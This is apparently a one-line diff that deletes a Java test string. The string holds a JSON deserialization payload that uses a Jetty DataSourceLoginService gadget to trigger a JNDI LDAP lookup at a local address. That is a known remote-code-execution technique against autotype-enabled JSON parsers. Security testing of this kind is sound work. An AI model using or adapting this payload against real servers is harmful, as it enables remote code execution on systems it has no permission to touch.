@@ -1,1 +1,0 @@
-String exp = "{\"@type\":\"org.eclipse.jetty.plus.security.DataSourceLoginService\",\"jndiName\":\"ldap://127.0.0.1:8990/test\"}";
